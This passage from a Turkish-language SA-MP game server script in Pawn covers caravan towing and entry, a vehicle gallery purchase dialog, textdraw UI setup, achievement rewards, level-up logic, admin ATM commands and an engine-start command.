	INI_Int("GType", Galeri[ GaleriID ][GType]);
	INI_Float("X", Galeri[ GaleriID ][GX]);
	INI_Float("Y", Galeri[ GaleriID ][GY]);
	INI_Float("Z", Galeri[ GaleriID ][GZ]);
	Galeri[ GaleriID ][GExist] = 1;
	return 1;
}

// < Karavan Sistemi > =========================================================
// /karavan
CMD:karavan(playerid, params[])
{
	if(pKaravan[playerid] != -1)
	{
	    new Float:oX, Float:oY, Float:oZ;
	    GetVehiclePos(pKaravan[playerid], oX, oY, oZ);
		SetPlayerInterior(playerid, 0);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerPos(playerid, oX+2.0, oY+2.0, oZ);
		Beklet(playerid);
		pKaravan[playerid] = -1;
		Bilgi(playerid, "Karavandan çýktýnýz.");
		return 1;
	}
	new YakinKaravan = GetNearKaravan(playerid);
	if(YakinKaravan == -1) return Hata(playerid, "Yakýnlarda karavan yok!");
	pKaravan[playerid] = YakinKaravan;
	SetPlayerPos(playerid, 2513.19897, -1729.12073, 778.67657);
	SetPlayerInterior(playerid, 0);
	SetPlayerVirtualWorld(playerid, pKaravan[playerid]+1);
	Beklet(playerid);
	Bilgi(playerid, "Karavana girdiniz. Karavandan çýkmak için tekrar ayný komutu yazýnýz.");
	return 1;
}

// GetNearKaravan
GetNearKaravan(playerid)
{
	new Sonuc = -1, Float:oX, Float:oY, Float:oZ;
	for(new i; i < MAX_VEHICLES; i++)
	{
	    if(GetVehicleModel(i) == 0) continue;
	    if(Araclar[i][AracKaravan] == true)
	    {
			GetVehiclePos(i, oX, oY, oZ);
			if(IsPlayerInRangeOfPoint(playerid, 3.0, oX, oY, oZ))
			{
				Sonuc = i;
				break;
			}
	    }
	}
	return Sonuc;
}

// GetNearKaravanForTow
GetNearKaravanForTow(playerid)
{
	new Sonuc = -1, Float:oX, Float:oY, Float:oZ;
	for(new i; i < MAX_VEHICLES; i++)
	{
	    if(GetVehicleModel(i) == 0) continue;
	    if(Araclar[i][AracKaravan] == true)
	    {
			GetVehiclePos(i, oX, oY, oZ);
			if(IsPlayerInRangeOfPoint(playerid, 6.0, oX, oY, oZ) && !strcmp(AracSHP[ Araclar[i][AracSHPID] ][ASHPSahip], GetName(playerid), true))
			{
				Sonuc = i;
				break;
			}
	    }
	}
	return Sonuc;
}

// KaravanKeys
KaravanKeys(playerid, newkeys, oldkeys)
{
	#pragma unused oldkeys
	if(newkeys == KEY_YES)
	{
	    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	    {
			if(!IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)))
			{
			    new YakinKaravan = GetNearKaravanForTow(playerid);
			    if(YakinKaravan != -1)
			    {
			        AttachTrailerToVehicle(YakinKaravan, GetPlayerVehicleID(playerid));
			        Bilgi(playerid, "Karavaný aracýnýza taktýnýz. Çýkarmak için tekrar {00CED1}Y Tuþu{ADFF2F}na basýn.");
			    }
			}else{
				if(Araclar[ GetVehicleTrailer( GetPlayerVehicleID(playerid) ) ][AracKaravan] == true)
				{
					DetachTrailerFromVehicle(GetPlayerVehicleID(playerid));
					Bilgi(playerid, "Karavaný aracýnýzdan çýkardýnýz.");
				}
			}
	    }
	}
	return 1;
}

// KaravanDialogs
KaravanDialogs(playerid, dialogid, response)
{
	switch(dialogid)
	{
	    case DialogKaravan:
	    {
	        if(response)
	        {
	            if(GetPlayerAracCount(playerid) == MAX_OYUNCU_ARAC) return Hata(playerid, "{FFCC00}» {FFFFFF}Araç satýn alma sýnýrýný aþmýþsýnýz!");
				if(APlayerData[playerid][PlayerMoney] < 1000000) return Hata(playerid, "{FFCC00}» {FFFFFF}Karavan satýn alabilmek için yeterli paranýz yok!");
				Karavan_Yeni(GetName(playerid), 30.000, 30.000, 30.000, 0.0, random(300), random(300), 1000000, GetName(playerid));
				ParaVer(playerid, -1000000);
				Bilgi(playerid, "{FFCC00}» {FFCC00}1.000.000$ {FFFFFF}karþýlýðýnda karavan satýn aldýnýz.");
				Bilgi(playerid, "{FFCC00}» {FFCC00}/araba {FFFFFF}komutu ile karavanýnýzý yanýnýza çekebilirsiniz.");
			}
	    }
	}
	return 1;
}

// Karavan_Yeni
Karavan_Yeni(Sahip[], Float:X, Float:Y, Float:Z, Float:Rot, Renk1, Renk2, Fiyat, Plaka[])
{
	new ASHPSID = Arac_Yeni(607, Sahip, X, Y, Z, Rot, Renk1, Renk2, Fiyat, Plaka);
	AracSHP[ASHPSID][ASHPKaravan] = 1;
	AracSHP[ASHPSID][ASHPNeedSave] = true;
	new CreatedID = AracSHP[ASHPSID][ASHPVehID];
	Araclar[CreatedID][AracKaravan] = true;
 	Araclar[CreatedID][AracKaravanObj] = CreateDynamicObjectEx(3171, 0, 0, 0, 0, 0, 0, 100.0);
  	AttachDynamicObjectToVehicle(Araclar[CreatedID][AracKaravanObj], CreatedID, 0.084999, -2.125115, -1.144999, -3.014999, 0.000000, 178.890090);

	new KarYazi[500];
	format(KarYazi, 500, "{80FFFF}KARAVAN\n \n{DDDDDD}Sahip {FFC000}%s\n{DDDDDD}Ýçeri girmek için {ADFF2F}/karavan\n{DDDDDD}Aracýnýza takmak için {ADFF2F}Y Tuþu", AracSHP[ Araclar[CreatedID][AracSHPID] ][ASHPSahip]);
	Araclar[CreatedID][AracKaravan3D] = CreateDynamic3DTextLabelEx(KarYazi, -1, 0, 0, 0, 100.0, INVALID_PLAYER_ID, CreatedID);
	return CreatedID;
}
CMD:karavansevermisin(playerid, params[])
{
    	ShowPlayerDialog(playerid, DialogKaravan, DIALOG_STYLE_MSGBOX, "{80FFFF}Karavan Satýn Al", "{FFCC00}» {FFFFFF}1.000.000${DDDDDD}'a karavan satýn almak istiyor musunuz?", "Evet", "Hayýr");

	return 1;
}
CMD:galeri(playerid, params[])
{
    // Araç Sahiplik Sistemi
			new YakinGaleri = NearGaleri(playerid);
	    	if(Galeri[YakinGaleri][GType] == Galeri_Karavan)
	    	{
    	 		cmd_karavansevermisin(playerid, params);
			}else
			if(YakinGaleri != -1 && GetPlayerVirtualWorld(playerid) == 0)
			{
				GaleriTip[playerid] = Galeri[YakinGaleri][GType];
				Galeride[playerid] = true;
				GaleriSayfa[playerid] = 1;

				GaleriUI_Show(playerid);
				SelectTextDraw(playerid, 0xFF0000FF);

				Bilgi(playerid, "{FFCC00}» {FFFFFF}Satýn almak istediðiniz aracýn resminin üzerine týklayýnýz.");
				Bilgi(playerid, "{FFCC00}» {FFFFFF}Satýn alma ekranýný kapatmak için {FFCC00}ESC tuþu{FFFFFF}na basabilirsiniz.");
			}else{
			SendClientMessage(playerid,-1,"{FFCC00}» {FFFFFF}Yakýnda bir galeri yok.");
			}
	return 1;
}
Bilgi(playerid, msg[])
{
	new Yazi[500];
	format(Yazi, 500, "{00FF00}%s", msg);
	return SendClientMessage(playerid, -1, Yazi);
}
ParaVer(playerid, miktar)
{
    RewardPlayer(playerid, miktar, 0);
}
// AKUI_Load
AKUI_Load(playerid)
{
	UI_AKBG[playerid] = CreatePlayerTextDraw(playerid,161.000000, 121.000000, "_");
	PlayerTextDrawBackgroundColor(playerid,UI_AKBG[playerid], 255);
	PlayerTextDrawFont(playerid,UI_AKBG[playerid], 1);
	PlayerTextDrawLetterSize(playerid,UI_AKBG[playerid], 0.500000, 26.000003);
	PlayerTextDrawColor(playerid,UI_AKBG[playerid], -1);
	PlayerTextDrawSetOutline(playerid,UI_AKBG[playerid], 0);
	PlayerTextDrawSetProportional(playerid,UI_AKBG[playerid], 1);
	PlayerTextDrawSetShadow(playerid,UI_AKBG[playerid], 1);
	PlayerTextDrawUseBox(playerid,UI_AKBG[playerid], 1);
	PlayerTextDrawBoxColor(playerid,UI_AKBG[playerid], 150);
	PlayerTextDrawTextSize(playerid,UI_AKBG[playerid], 484.000000, 0.000000);
	PlayerTextDrawSetSelectable(playerid,UI_AKBG[playerid], 0);

	new Float:TextX, Float:TextY;

	for(new i; i < 6; i++)
	{
	    TextX = 167.0 + (162.0 * (i % 2));
	    TextY = 128.0 + (70.0 * ( (i - (i % 2)) / 2 ));

		UI_AKItemBG[playerid][i] = CreatePlayerTextDraw(playerid,TextX, TextY, "_");
		PlayerTextDrawBackgroundColor(playerid,UI_AKItemBG[playerid][i], 255);
		PlayerTextDrawFont(playerid,UI_AKItemBG[playerid][i], 1);
		PlayerTextDrawLetterSize(playerid,UI_AKItemBG[playerid][i], 0.500000, 6.599999);
		PlayerTextDrawColor(playerid,UI_AKItemBG[playerid][i], -1);
		PlayerTextDrawSetOutline(playerid,UI_AKItemBG[playerid][i], 0);
		PlayerTextDrawSetProportional(playerid,UI_AKItemBG[playerid][i], 1);
		PlayerTextDrawSetShadow(playerid,UI_AKItemBG[playerid][i], 1);
		PlayerTextDrawUseBox(playerid,UI_AKItemBG[playerid][i], 1);
		PlayerTextDrawBoxColor(playerid,UI_AKItemBG[playerid][i], -156);
		PlayerTextDrawTextSize(playerid,UI_AKItemBG[playerid][i], 318.0 + (160.0 * (i%2)), 0.000000);
		PlayerTextDrawSetSelectable(playerid,UI_AKItemBG[playerid][i], 0);


		TextX = 165.0 + (161.0 * (i % 2));
		TextY = 125.0 + (70.0 * ( (i - (i % 2)) / 2 ));

		UI_AKItemModel[playerid][i] = CreatePlayerTextDraw(playerid,TextX, TextY, "Model1");
		PlayerTextDrawBackgroundColor(playerid,UI_AKItemModel[playerid][i], 255);
		PlayerTextDrawFont(playerid,UI_AKItemModel[playerid][i], 5);
		PlayerTextDrawLetterSize(playerid,UI_AKItemModel[playerid][i], 0.500000, 1.000000);
		PlayerTextDrawColor(playerid,UI_AKItemModel[playerid][i], -1);
		PlayerTextDrawSetOutline(playerid,UI_AKItemModel[playerid][i], 0);
		PlayerTextDrawSetProportional(playerid,UI_AKItemModel[playerid][i], 1);
		PlayerTextDrawSetShadow(playerid,UI_AKItemModel[playerid][i], 1);
		PlayerTextDrawUseBox(playerid,UI_AKItemModel[playerid][i], 1);
		PlayerTextDrawBoxColor(playerid,UI_AKItemModel[playerid][i], 255);
		PlayerTextDrawTextSize(playerid,UI_AKItemModel[playerid][i], 65.000000, 65.000000);
		PlayerTextDrawSetPreviewModel(playerid, UI_AKItemModel[playerid][i], 560);
		PlayerTextDrawSetPreviewRot(playerid, UI_AKItemModel[playerid][i], -10.000000, 0.000000, -45.000000, 0.889999);
		PlayerTextDrawSetSelectable(playerid,UI_AKItemModel[playerid][i], 1);


		TextX = 237.0 + (162.0 * (i % 2));
		TextY = 142.0 + (70.0 * ( (i - (i % 2)) / 2 ));

		UI_AKItemInfo[playerid][i] = CreatePlayerTextDraw(playerid,TextX, TextY, "Hotring Racer A~n~~y~20 Level~n~~g~~h~~h~~h~5000$");
		PlayerTextDrawBackgroundColor(playerid,UI_AKItemInfo[playerid][i], 255);
		PlayerTextDrawFont(playerid,UI_AKItemInfo[playerid][i], 1);
		PlayerTextDrawLetterSize(playerid,UI_AKItemInfo[playerid][i], 0.240000, 1.099999);
		PlayerTextDrawColor(playerid,UI_AKItemInfo[playerid][i], -1);
		PlayerTextDrawSetOutline(playerid,UI_AKItemInfo[playerid][i], 1);
		PlayerTextDrawSetProportional(playerid,UI_AKItemInfo[playerid][i], 1);
		PlayerTextDrawSetPreviewModel(playerid, UI_AKItemInfo[playerid][i], 560);
		PlayerTextDrawSetPreviewRot(playerid, UI_AKItemInfo[playerid][i], -10.000000, 0.000000, -45.000000, 0.889999);
		PlayerTextDrawSetSelectable(playerid,UI_AKItemInfo[playerid][i], 0);
	}

	UI_AKPrev[playerid] = CreatePlayerTextDraw(playerid,167.000000, 338.000000, "<");
	PlayerTextDrawBackgroundColor(playerid,UI_AKPrev[playerid], 255);
	PlayerTextDrawFont(playerid,UI_AKPrev[playerid], 1);
	PlayerTextDrawLetterSize(playerid,UI_AKPrev[playerid], 0.270000, 1.300000);
	PlayerTextDrawColor(playerid,UI_AKPrev[playerid], -1);
	PlayerTextDrawSetOutline(playerid,UI_AKPrev[playerid], 1);
	PlayerTextDrawSetProportional(playerid,UI_AKPrev[playerid], 1);
	PlayerTextDrawUseBox(playerid,UI_AKPrev[playerid], 1);
	PlayerTextDrawBoxColor(playerid,UI_AKPrev[playerid], 13554005);
	PlayerTextDrawTextSize(playerid,UI_AKPrev[playerid], 174.000000, 10.000000);
	PlayerTextDrawSetSelectable(playerid,UI_AKPrev[playerid], 1);

	UI_AKNext[playerid] = CreatePlayerTextDraw(playerid,471.000000, 338.000000, ">");
	PlayerTextDrawBackgroundColor(playerid,UI_AKNext[playerid], 255);
	PlayerTextDrawFont(playerid,UI_AKNext[playerid], 1);
	PlayerTextDrawLetterSize(playerid,UI_AKNext[playerid], 0.270000, 1.300000);
	PlayerTextDrawColor(playerid,UI_AKNext[playerid], -1);
	PlayerTextDrawSetOutline(playerid,UI_AKNext[playerid], 1);
	PlayerTextDrawSetProportional(playerid,UI_AKNext[playerid], 1);
	PlayerTextDrawUseBox(playerid,UI_AKNext[playerid], 1);
	PlayerTextDrawBoxColor(playerid,UI_AKNext[playerid], 13554005); //-156
	PlayerTextDrawTextSize(playerid,UI_AKNext[playerid], 478.000000, 10.000000);
	PlayerTextDrawSetSelectable(playerid,UI_AKNext[playerid], 1);

	UI_AKSayfa[playerid] = CreatePlayerTextDraw(playerid,325.000000, 338.000000, "1/25");
	PlayerTextDrawAlignment(playerid,UI_AKSayfa[playerid], 2);
	PlayerTextDrawBackgroundColor(playerid,UI_AKSayfa[playerid], 255);
	PlayerTextDrawFont(playerid,UI_AKSayfa[playerid], 1);
	PlayerTextDrawLetterSize(playerid,UI_AKSayfa[playerid], 0.220000, 1.100000);
	PlayerTextDrawColor(playerid,UI_AKSayfa[playerid], -1);
	PlayerTextDrawSetOutline(playerid,UI_AKSayfa[playerid], 1);
	PlayerTextDrawSetProportional(playerid,UI_AKSayfa[playerid], 1);
	PlayerTextDrawSetSelectable(playerid,UI_AKSayfa[playerid], 0);

	return 1;
}

CMD:basarimlar(playerid, params[])
{
	new DiaYazi[2000];
	format(DiaYazi, 2000, "%sBaþarým\tAçýklama\tDurum\n", DiaYazi);

	for(new i; i < sizeof(Basarimlar); i++)
	{
 		if(DidPlayerAchieve(playerid, i))
   		{
     		format(DiaYazi, 2000, "%s{FFC000}%s\t{F8F8FF}%s\t{ADFF2F}TAMAMLANDI\n", DiaYazi, Basarimlar[i][AchName], Basarimlar[i][AchBilgi]);
	    }else{
			format(DiaYazi, 2000, "%s{FFC000}%s\t{F8F8FF}%s\t{FF4040}%d/%d\n", DiaYazi, Basarimlar[i][AchName], Basarimlar[i][AchBilgi], GetPlayerAchievement(playerid, i), Basarimlar[i][AchMiktar]);
		}
	}

	ShowPlayerDialog(playerid, 9999, DIALOG_STYLE_TABLIST_HEADERS, "{80FFFF}Baþarým Ýlerlemesi", DiaYazi, "Geri", "");
	return 1;
}

// OnPlayerAchieve
public OnPlayerAchieve(playerid, achid)
{
    new Yazi[500];

	if(achid == MerakliOyuncuAch)
 	{
		Bilgi(playerid, "{FF4040}\"Meraklý Oyuncu\" {ADFF2F}baþarýmýný kazandýnýz!");
		Bilgi(playerid, "{00CED1}30.000$, 10 Skor ve 30 EXP {ADFF2F}ödül aldýnýz.");
		OdulVer(playerid, 30000, 10, 30);
	}

	if(achid == HirsliOyuncuAch)
 	{
		Bilgi(playerid, "{FF4040}\"Hýrslý Oyuncu\" {ADFF2F}baþarýmýný kazandýnýz!");
		Bilgi(playerid, "{00CED1}100.000$, 30 Skor ve 50 EXP {ADFF2F}ödül aldýnýz.");
		OdulVer(playerid, 100000, 30, 50);
	}

	if(achid == DaimiOyuncuAch)
 	{
		Bilgi(playerid, "{FF4040}\"Daimi Oyuncu\" {ADFF2F}baþarýmýný kazandýnýz!");
		Bilgi(playerid, "Sunucumuzu tercih ettiðiniz için teþekkür ederiz!");
		Bilgi(playerid, "{00CED1}1.000.000$, 100 Skor ve 75 EXP {ADFF2F}ödül aldýnýz.");
		OdulVer(playerid, 1000000, 100, 75);
	}

	if(achid == ServerEmektariAch)
 	{
		Bilgi(playerid, "{FF4040}\"Server Emektarý\" {ADFF2F}baþarýmýný kazandýnýz!");
		Bilgi(playerid, "Artýk Fusional Dream'ýn unutulmayacak isimlerindensiniz!");
		Bilgi(playerid, "Bu baþarýnýzýn ekran görüntüsünü {00CED1}F8 Tuþu {ADFF2F}ile çekerek arkadaþlarýnýzla paylaþabilirsiniz.");
		Bilgi(playerid, "{00CED1}10.000.000$, 1000 Skor ve 200 EXP {ADFF2F}ödül aldýnýz.");
		OdulVer(playerid, 10000000, 1000, 200);

		format(Yazi, 500, "{48D1CC}%s {ADFF2F}artýk bir {FF4040}SERVER EMEKTARI!", GetName(playerid));
		SendClientMessageToAll(-1, Yazi);
	}

	if(achid == YatirimciAch)
	{
		Bilgi(playerid, "{FF4040}\"Yatýrýmcý\" {ADFF2F}baþarýmýný kazandýnýz!");
		Bilgi(playerid, "Sunucumuzu tercih ettiðiniz için teþekkür ederiz!");
		Bilgi(playerid, "{00CED1}100.000$, 5 Skor ve 25 EXP {ADFF2F}ödül aldýnýz.");
		OdulVer(playerid, 100000, 5, 25);
  	}

	if(achid == AtNaliAch)
 	{
		Bilgi(playerid, "{FFC000}\"At Nalý Avcýsý\" {ADFF2F}baþarýmýný kazandýnýz!");
   	}

	if(achid == ArabaSevdasiAch)
 	{
		Bilgi(playerid, "{FF4040}\"Araba Sevdasý\" {ADFF2F}baþarýmýný kazandýnýz!");
		Bilgi(playerid, "{00CED1}20.000$, 20 Skor ve 30 EXP {ADFF2F}ödül aldýnýz.");
		OdulVer(playerid, 20000, 20, 30);
	}

	if(achid == EvimAch)
 	{
		Bilgi(playerid, "{FF4040}\"Evim Evim Güzel Evim\" {ADFF2F}baþarýmýný kazandýnýz!");
		Bilgi(playerid, "{00CED1}20.000$, 20 Skor ve 30 EXP {ADFF2F}ödül aldýnýz.");
		OdulVer(playerid, 20000, 20, 30);
   	}

	if(achid == DayiyaSorAch)
 	{
		Bilgi(playerid, "{FF4040}\"Aha Dayýya Sor\" {ADFF2F}baþarýmýný kazandýnýz!");
		Bilgi(playerid, "{00CED1}50.000$, 10 Skor ve 5 EXP {ADFF2F}ödül aldýnýz.");
		OdulVer(playerid, 50000, 10, 5);
   	}

	if(achid == CopcuAch)
 	{
		Bilgi(playerid, "{FF4040}\"Çöpçüler Kralý\" {ADFF2F}baþarýmýný kazandýnýz!");
		Bilgi(playerid, "{00CED1}100.000$, 100 Skor ve 200 EXP {ADFF2F}ödül aldýnýz.");
		OdulVer(playerid, 100000, 100, 200);
   	}

	if(achid == KargocuAch)
 	{
		Bilgi(playerid, "{FF4040}\"Anýnda Teslim\" {ADFF2F}baþarýmýný kazandýnýz!");
		Bilgi(playerid, "{00CED1}100.000$, 100 Skor ve 200 EXP {ADFF2F}ödül aldýnýz.");
		OdulVer(playerid, 100000, 100, 200);
   	}

	if(achid == PizzaciAch)
 	{
		Bilgi(playerid, "{FF4040}\"Evlere Servis\" {ADFF2F}baþarýmýný kazandýnýz!");
		Bilgi(playerid, "{00CED1}100.000$, 100 Skor ve 200 EXP {ADFF2F}ödül aldýnýz.");
		OdulVer(playerid, 100000, 100, 200);
   	}

	if(achid == PolisAch)
 	{
		Bilgi(playerid, "{FF4040}\"Rýza Baba\" {ADFF2F}baþarýmýný kazandýnýz!");
		Bilgi(playerid, "{00CED1}1.000.000$, 100 Skor ve 300 EXP {ADFF2F}ödül aldýnýz.");
		OdulVer(playerid, 1000000, 100, 300);
   	}

	if(achid == KamyoncuAch)
 	{
		Bilgi(playerid, "{FF4040}\"Yollarýn Kralý\" {ADFF2F}baþarýmýný kazandýnýz!");
		Bilgi(playerid, "{00CED1}100.000$, 100 Skor ve 200 EXP {ADFF2F}ödül aldýnýz.");
		OdulVer(playerid, 100000, 100, 200);
  	}

	if(achid == PilotAch)
 	{
		Bilgi(playerid, "{FF4040}\"Kaptan Pilot\" {ADFF2F}baþarýmýný kazandýnýz!");
		Bilgi(playerid, "{00CED1}100.000$, 100 Skor ve 200 EXP {ADFF2F}ödül aldýnýz.");
		OdulVer(playerid, 100000, 100, 200);
   	}

	if(achid == OtobuscuAch)
 	{
		Bilgi(playerid, "{FF4040}\"Yularýmý Verin\" {ADFF2F}baþarýmýný kazandýnýz!");
		Bilgi(playerid, "{00CED1}100.000$, 100 Skor ve 200 EXP {ADFF2F}ödül aldýnýz.");
		OdulVer(playerid, 100000, 100, 200);
   	}

	if(achid == ItfaiyeciAch)
 	{
		Bilgi(playerid, "{FF4040}\"Þehir Koruyucusu\" {ADFF2F}baþarýmýný kazandýnýz!");
		Bilgi(playerid, "{00CED1}100.000$, 100 Skor ve 200 EXP {ADFF2F}ödül aldýnýz.");
		OdulVer(playerid, 100000, 100, 200);
   	}
   	if(achid == DolmuscuAch)
 	{
		Bilgi(playerid, "{FF4040}\"Yallah Þoför Yallah\" {ADFF2F}baþarýmýný kazandýnýz!");
		Bilgi(playerid, "{00CED1}100.000$, 100 Skor ve 200 EXP {ADFF2F}ödül aldýnýz.");
		OdulVer(playerid, 100000, 100, 200);
   	}
   	if(achid == MafyaAch)
 	{
		Bilgi(playerid, "{FF4040}\"Aðýr abi\" {ADFF2F}baþarýmýný kazandýnýz!");
		Bilgi(playerid, "{00CED1}100.000$, 100 Skor ve 200 EXP {ADFF2F}ödül aldýnýz.");
		OdulVer(playerid, 100000, 100, 200);
   	}
   	if(achid == GemiciAch)
 	{
		Bilgi(playerid, "{FF4040}\"Denizlerin Kralý\" {ADFF2F}baþarýmýný kazandýnýz!");
		Bilgi(playerid, "{00CED1}100.000$, 100 Skor ve 200 EXP {ADFF2F}ödül aldýnýz.");
		OdulVer(playerid, 100000, 100, 200);
   	}
   	if(achid == BankaciAch)
 	{
		Bilgi(playerid, "{FF4040}\"Money Money\" {ADFF2F}baþarýmýný kazandýnýz!");
		Bilgi(playerid, "{00CED1}100.000$, 100 Skor ve 200 EXP {ADFF2F}ödül aldýnýz.");
		OdulVer(playerid, 100000, 100, 200);
   	}
   	if(achid == CevikAdamAch)
 	{
		Bilgi(playerid, "{FF4040}\"Çeviklerin Çeviði\" {ADFF2F}baþarýmýný kazandýnýz!");
		Bilgi(playerid, "{00CED1}100.000$, 100 Skor ve 400 EXP {ADFF2F}ödül aldýnýz.");
		OdulVer(playerid, 100000, 100, 400);
   	}
   	if(achid == FedakarYardimciAch)
 	{
		Bilgi(playerid, "{FF4040}\"Koca yürekli helper\" {ADFF2F}baþarýmýný kazandýnýz!");
		Bilgi(playerid, "{00CED1}100.000$, 10 Skor ve 50 EXP {ADFF2F}ödül aldýnýz.");
		OdulVer(playerid, 100000, 10, 50);
   	}

	return 1;
}
OdulVer(playerid, PARA, SKOR, xp)
{
    RewardPlayer(playerid, PARA, SKOR);
    EXP[playerid] = EXP[playerid] + xp;
}
// LevelKontrol
LevelKontrol(playerid)
{

	if(EXP[playerid] >= Level[playerid] * 10)
	{
	    EXP[playerid] -= Level[playerid] * 10;
		Level[playerid]++;
		PlayerPlaySound(playerid, 1057, 0.0, 0.0, 0.0);
		GameTextForPlayer(playerid, "~u~ ~g~~h~~h~LEVEL UP! ~u~", 3000, 5);
	}

	if(EXP[playerid] < 0)
	{
	    if(Level[playerid] == 1) return 1;

		Level[playerid]--;
	    EXP[playerid] += Level[playerid] * 10;
  		PlayerPlaySound(playerid, 1130, 0.0, 0.0, 0.0);
		GameTextForPlayer(playerid, "~d~ ~r~LEVEL DOWN! ~d~", 3000, 5);
	}
	return 1;
}

// ATM sistemi
CMD:createatm(playerid, params[])
{
	static
	    id = -1;

    if(APlayerData[playerid][PlayerLevel] < 5)
	    return SendErrorMessage(playerid, "{FFCC00}» {FFFFFF}Bu komutu kullanmak için yetkiniz yok.");

	id = ATM_Create(playerid);

	if (id == -1)
	    return SendErrorMessage(playerid, "The server has reached the limit for ATM machines.");

	SendClientMessage(playerid, COLOR_DEPARTMENT, "« SUNUCU »:{FFFFFF} You have successfully created ATM.");
	return 1;
}
CMD:destroyatm(playerid, params[])
{
	static
	    id = 0;

    if(APlayerData[playerid][PlayerLevel] < 5)
	    return SendErrorMessage(playerid, "{FFCC00}» {FFFFFF}Bu komutu kullanmak için yetkiniz yok.");

	if (sscanf(params, "d", id))
	    return SendSyntaxMessage(playerid, "/destroyatm [atm id]");

	if ((id < 0 || id >= MAX_ATM_MACHINES) || !ATMData[id][atmExists])
	    return SendErrorMessage(playerid, "You have specified an invalid ATM ID.");

	ATM_Delete(id);
	SendClientMessage(playerid, COLOR_DEPARTMENT, "« SUNUCU »:{FFFFFF} You have successfully destroyed ATM.");
	return 1;
}


CMD:atm(playerid, params[])
{
	if (ATM_Nearest(playerid) == -1)
	    return SendErrorMessage(playerid, "{FFCC00}» {FFFFFF}Herhangi bir ATM'ye yakýn deðilsin.");

	Bank_ShowMenu(playerid);
	return 1;
}


CMD:motor(playerid, params[])
{
  SendAdminText(playerid, "/motor",params);
  if(IsPlayerInAnyVehicle(playerid))
  {
      if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER)return SendClientMessage(playerid, COLOR_CYAN,"*Sürücü koltuðunda deðilsin!");
	  new veh = GetPlayerVehicleID(playerid);
	  new Float:health;
	  GetVehicleHealth(veh, health);
	  new engine, lights, alarm, doors, bonnet, boot, objective;

		if(MotorMOD[veh] == 0)
		{
			  if (AVehicleData[veh][Fuel] == 0)
			  {
			  SendClientMessage(playerid, COLOR_CYAN,"{FFCC00}» {FFFFFF}Aracýn benzini olmadýðýndan dolayý çalýþtýrýlamadý!");
			  }else
			    if(health <= 1000 && health > 600)
				{
						    GetVehicleParamsEx(veh, engine, lights, alarm, doors, bonnet, boot, objective);
			                SetVehicleParamsEx(veh, true, lights, alarm, doors, bonnet, boot, objective);
			                new Yazi[512], Float:X, Float:Y, Float:Z;
							format(Yazi, 512, "{FFCC00}» {FFFFFF}motor çalýþmýþtýr - %s. (( %s ))", VehNames[ GetVehicleModel( GetPlayerVehicleID(playerid) ) - 400 ], GetName(playerid));

							GetPlayerPos(playerid, X, Y, Z);
							YakinMesaj(Yazi, 15.0, X, Y, Z);
			                MotorMOD[veh] = 1;
			    }
			   if(health < 600 && health > 500)
				{
				    new rand = random(4);
						    if(rand == 3)
						    {
						    GetVehicleParamsEx(veh, engine, lights, alarm, doors, bonnet, boot, objective);
			                SetVehicleParamsEx(veh, true, lights, alarm, doors, bonnet, boot, objective);
			                new Yazi[512], Float:X, Float:Y, Float:Z;
							format(Yazi, 512, "{00FFFF}* motor çalýþmýþtýr - %s. (( %s ))", VehNames[ GetVehicleModel( GetPlayerVehicleID(playerid) ) - 400 ], GetName(playerid));

							GetPlayerPos(playerid, X, Y, Z);
							YakinMesaj(Yazi, 15.0, X, Y, Z);
							MotorMOD[veh] = 1;
			                }
			                if(rand == 1)
			                {
			  			    GetVehicleParamsEx(veh, engine, lights, alarm, doors, bonnet, boot, objective);
			                SetVehicleParamsEx(veh, false, lights, alarm, doors, bonnet, boot, objective);
			                new Yazi[512], Float:X, Float:Y, Float:Z;
							format(Yazi, 512, "{00FFFF}* motor çalýþmamýþtýr - %s. (( %s ))", VehNames[ GetVehicleModel( GetPlayerVehicleID(playerid) ) - 400 ], GetName(playerid));

							GetPlayerPos(playerid, X, Y, Z);
							YakinMesaj(Yazi, 15.0, X, Y, Z);
			                MotorMOD[veh] = 0;
			                }
			    }
			    if(health < 500 && health > 300)
				{
				    new rand = random(2);
						    if(rand == 0)
						    {
						    GetVehicleParamsEx(veh, engine, lights, alarm, doors, bonnet, boot, objective);
			                SetVehicleParamsEx(veh, true, lights, alarm, doors, bonnet, boot, objective);
			                new Yazi[512], Float:X, Float:Y, Float:Z;
							format(Yazi, 512, "{00FFFF}* motor çalýþmýþtýr - %s. (( %s ))", VehNames[ GetVehicleModel( GetPlayerVehicleID(playerid) ) - 400 ], GetName(playerid));

							GetPlayerPos(playerid, X, Y, Z);
							YakinMesaj(Yazi, 15.0, X, Y, Z);
			                MotorMOD[veh] = 1;
			                }
			                if(rand == 1)
			                {
			  			    GetVehicleParamsEx(veh, engine, lights, alarm, doors, bonnet, boot, objective);
			                SetVehicleParamsEx(veh, false, lights, alarm, doors, bonnet, boot, objective);
			                new Yazi[512], Float:X, Float:Y, Float:Z;
							format(Yazi, 512, "{00FFFF}* motor çalýþmamýþtýr - %s. (( %s ))", VehNames[ GetVehicleModel( GetPlayerVehicleID(playerid) ) - 400 ], GetName(playerid));

							GetPlayerPos(playerid, X, Y, Z);
							YakinMesaj(Yazi, 15.0, X, Y, Z);
			                MotorMOD[veh] = 0;
			                }
			    }
		}else{
		    				GetVehicleParamsEx(veh, engine, lights, alarm, doors, bonnet, boot, objective);
			                SetVehicleParamsEx(veh, false, lights, alarm, doors, bonnet, boot, objective);
			                new Yazi[512], Float:X, Float:Y, Float:Z;
							format(Yazi, 512, "{00FFFF}* motor kapatýlmýþtýr - %s. (( %s ))", VehNames[ GetVehicleModel( GetPlayerVehicleID(playerid) ) - 400 ], GetName(playerid));

							GetPlayerPos(playerid, X, Y, Z);
							YakinMesaj(Yazi, 15.0, X, Y, Z);
			                MotorMOD[veh] = 0;
		}
 }else{

 SendClientMessage(playerid, COLOR_ORANGE,"{FFCC00}» {FFFFFF}Herhangi bir araçta deðilsin!");
 }
	return true;
}


CMD:engine(playerid, params[])
{
  SendAdminText(playerid, "/engine",params);
  if(IsPlayerInAnyVehicle(playerid))
  {
      if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER)return SendClientMessage(playerid, COLOR_CYAN,"*You're not in the driver's seat!");
	  new veh = GetPlayerVehicleID(playerid);
	  new Float:health;
	  GetVehicleHealth(veh, health);
	  new engine, lights, alarm, doors, bonnet, boot, objective;

		if(MotorMOD[veh] == 0)
		{
